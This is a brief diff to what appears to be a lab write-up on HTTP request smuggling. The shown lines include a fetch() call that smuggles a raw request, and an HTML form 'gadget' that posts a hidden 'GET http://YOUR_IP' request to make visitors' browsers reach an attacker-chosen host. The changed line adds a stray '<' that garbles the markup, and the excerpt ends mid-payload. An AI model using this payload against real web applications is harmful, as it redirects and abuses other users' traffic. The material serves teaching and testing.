@@ -32,7 +32,7 @@ fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HT
 
 ### We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
 
-<form id="btn" action="http://MACHINE_NAME.COM/"
+<<form id="btn" action="http://MACHINE_NAME.COM/"
     method="POST"
     enctype="text/plain">
 <textarea name="GET http://YOUR_IP HTTP/1.1
